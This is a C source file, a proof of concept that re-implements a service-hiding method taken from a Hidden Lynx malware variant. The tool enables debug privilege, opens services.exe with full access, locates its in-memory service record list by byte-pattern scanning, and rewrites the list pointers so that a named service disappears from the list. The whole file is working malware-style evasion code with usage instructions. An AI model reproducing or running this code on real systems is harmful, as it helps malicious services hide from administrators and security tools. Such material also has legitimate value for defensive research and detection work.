/* Copyright (c) 2014 Branden Clark
 *   MIT License: See LICENSE for details.
 *   It's only used because it's the least restrictive license I could find.
 * Description:
 *   Unlinking services from the service record list POC.
 *   Re-implementation of a method from a Hidden Lynx malware variant.
 */

#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <aclapi.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")

#define HS_INFO_BUFFER_SIZE 32767
#define HS_MAX_LEN_SVC_NAME 80

typedef struct hs_svc_entry {
    void *prev_ptr;
    void *next_ptr;
    TCHAR *svc_name;
    TCHAR *svc_display_name;
    int list_index;
    int unk_1;
    int magic_sErv;
    int unk_2;
    int unk_3;
    int unk_4;
    SERVICE_STATUS svc_status;
} hs_svc_entry;
typedef hs_svc_entry * HS_LPSVC_ENTRY;

TCHAR hs_szSvcName[HS_MAX_LEN_SVC_NAME];

/* Main functions */
VOID hs_do_unlink_svc(void);
HANDLE hs_get_services_handle(void);
LPVOID hs_find_svc_record_list(HANDLE hServices);
HS_LPSVC_ENTRY hs_find_svc_entry(HANDLE hServices, LPVOID svc_record_list);
BOOL hs_unlink_svc(HANDLE hServices, HS_LPSVC_ENTRY my_svc_entry);

/* Helpers */
VOID hs_display_usage(void);
BOOL hs_set_SeDebugPrivilege();

void _tmain(int argc, TCHAR *argv[])
{
    if( argc != 2 )
    {
        printf("ERROR: Incorrect number of arguments\n");
        hs_display_usage();
        return;
    }

    StringCchCopy(hs_szSvcName, HS_MAX_LEN_SVC_NAME, argv[1]);

    hs_do_unlink_svc();
}

VOID hs_display_usage()
{
    printf("Description:\n");
    printf("\tCommand-line tool that unlinks a service "
           "from the service record list.\n");
    printf("Usage:\n");
    printf("\tunlink_svc [service_name]\n");
}

VOID hs_do_unlink_svc()
{
    bool error = FALSE;
    if(!hs_set_SeDebugPrivilege())
        goto fail;
    // Get a handle to services.exe (process)
    HANDLE hServices = hs_get_services_handle();
    if (hServices == INVALID_HANDLE_VALUE)
        goto fail;
    // Find the first entry in the service record list
    LPVOID svc_record_list = hs_find_svc_record_list(hServices);
    if (svc_record_list == NULL)
        goto fail;
    // Find the requested entry by name
    HS_LPSVC_ENTRY my_svc_entry = hs_find_svc_entry(hServices, svc_record_list);
    if (my_svc_entry == NULL)
        goto fail;
    // Unlink the requested entry
    if (!hs_unlink_svc(hServices, my_svc_entry))
        goto fail;
end:
    _tprintf(TEXT("%s %s from the service record list.\n"),
             (error) ? TEXT("Failed to unlink") : TEXT("Sucessfully unlinked"),
             hs_szSvcName);
    return;
fail:
    error = TRUE;
    goto end;
}

BOOL hs_set_SeDebugPrivilege()
{
    HANDLE hProcess;
    HANDLE hToken;
    TOKEN_PRIVILEGES dbg_tp;
    LUID dbg_luid;
    DWORD my_pid = GetCurrentProcessId();

    // Get my access token
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_SET_INFORMATION, FALSE, my_pid);
    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
        return FALSE;

    // Lookup value for SeDebugPrivilege
    if (!LookupPrivilegeValue(NULL, TEXT("SeDebugPrivilege"), &dbg_luid)) {
        return FALSE;
    }

    // Escalate my privileges
    dbg_tp.PrivilegeCount = 1;
    dbg_tp.Privileges[0].Luid = dbg_luid;
    dbg_tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &dbg_tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) ||
        GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        return FALSE;
    }
    return TRUE;
}

HANDLE hs_get_services_handle()
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    // Begin process enumeration
    hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return INVALID_HANDLE_VALUE;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return INVALID_HANDLE_VALUE;
    }

    // Enumerate the processes
    do {
        if (lstrcmpi(pe32.szExeFile, TEXT("services.exe")) == 0) {
            CloseHandle(hProcessSnap);
            return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return INVALID_HANDLE_VALUE;
}

LPVOID hs_find_svc_record_list(HANDLE hServices)
{
    TCHAR info_buf[HS_INFO_BUFFER_SIZE];
    DWORD bytes_read = 0;
    SYSTEM_INFO sys_info;
    DWORD alloc_gran = 0;
    HS_LPSVC_ENTRY ret = 0;
    DWORD tmp_buf = 0;
    HANDLE svc_file = INVALID_HANDLE_VALUE;
    HANDLE file_map = INVALID_HANDLE_VALUE;
    LPDWORD file_view = NULL;

    // Open services.exe
    GetSystemDirectory(info_buf, HS_INFO_BUFFER_SIZE);
    StringCchCat(info_buf, HS_INFO_BUFFER_SIZE, TEXT("\\services.exe"));
    svc_file = CreateFile(info_buf, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (svc_file == INVALID_HANDLE_VALUE)
        goto fail;

    // Get allocation granularity
    GetSystemInfo(&sys_info);
    alloc_gran = sys_info.dwAllocationGranularity;

    // Create mapping for file
    file_map = CreateFileMapping(svc_file, NULL, PAGE_READONLY, 0, alloc_gran, TEXT("hs_services_mapping"));
    if (file_map == INVALID_HANDLE_VALUE)
        goto fail;

    // Search for service record list head
    for (DWORD x = 0; x < HS_INFO_BUFFER_SIZE; x+=alloc_gran) {
        // Map file to memory
        file_view = (LPDWORD)MapViewOfFile(file_map, FILE_MAP_READ, 0, x, alloc_gran);
        if (file_view == INVALID_HANDLE_VALUE || file_view == NULL) {
            goto fail;
        }
        // Scan memory for service record list head
        for (LPBYTE y = (LPBYTE)file_view; (LPDWORD)y < file_view+(alloc_gran/sizeof(DWORD)); y+=1) {
            if (*((LPDWORD)y) == 0xA1909090) {
                if (*(((LPDWORD)y)+2) == 0x909090C3) {
                    // Get first real entry from head
                    if(!ReadProcessMemory(hServices, (LPVOID)*(((LPDWORD)y)+1), &ret, 4, &bytes_read) ||
                        bytes_read != 4) {
                        goto fail;
                    }
                    // Get service entry magic number
                    if(!ReadProcessMemory(hServices, ((LPDWORD)ret)+6, &tmp_buf, 4, &bytes_read) ||
                        bytes_read != 4) {
                        goto fail;
                    }
                    // Check magic number
                    UnmapViewOfFile(file_view);
                    if (tmp_buf == 0x76724573/*sErv*/) {
                        return ret;
                    }
                }
            }
        }
        UnmapViewOfFile(file_view);
        file_view = NULL;
    }
fail:
    CloseHandle(svc_file);
    UnmapViewOfFile(file_view);
    CloseHandle(file_map);
    return NULL;
}

HS_LPSVC_ENTRY hs_find_svc_entry(HANDLE hServices, LPVOID svc_record_list)
{
    HS_LPSVC_ENTRY lpsvc_entry = (HS_LPSVC_ENTRY)svc_record_list;
    LPDWORD lpsvc_name;
    TCHAR svc_name[HS_MAX_LEN_SVC_NAME];
    SIZE_T bytes_read = 0;

    // Find the service entry with specified name
    do {
        // Read svc_name ptr
        if (!ReadProcessMemory(hServices, ((LPDWORD)lpsvc_entry)+2,
                               &lpsvc_name, 4, &bytes_read) || bytes_read != 4) {
            return NULL;
        }
        // Read svc_name
        if (!ReadProcessMemory(hServices, lpsvc_name,
                               svc_name, HS_MAX_LEN_SVC_NAME, &bytes_read) || bytes_read != HS_MAX_LEN_SVC_NAME) {
            return NULL;
        }
        // Is this the right service entry?
        if (lstrcmpi(svc_name, hs_szSvcName) == 0) {
            return lpsvc_entry;
        }
        // Go to next entry
    } while (lpsvc_entry != NULL &&
              ReadProcessMemory(hServices, ((LPDWORD)lpsvc_entry)+1, &lpsvc_entry, 4, &bytes_read) &&
             bytes_read == 4);
    return NULL;
}

BOOL hs_unlink_svc(HANDLE hServices, HS_LPSVC_ENTRY my_svc_entry)
{
    hs_svc_entry tmp_buf;
    DWORD num_bytes = 0;
    if (!ReadProcessMemory(hServices, my_svc_entry, &tmp_buf, 8, &num_bytes) || num_bytes != 8)
        return FALSE;
    // my_prev->next = my_next
    if (!WriteProcessMemory(hServices, ((LPDWORD)tmp_buf.prev_ptr) + 1, &tmp_buf.next_ptr, 4, &num_bytes) || num_bytes != 4)
        return FALSE;
    // my_next->prev = my_prev
    if (!WriteProcessMemory(hServices, tmp_buf.next_ptr, &tmp_buf.prev_ptr, 4, &num_bytes) || num_bytes != 4)
        return FALSE;
    return TRUE;
}
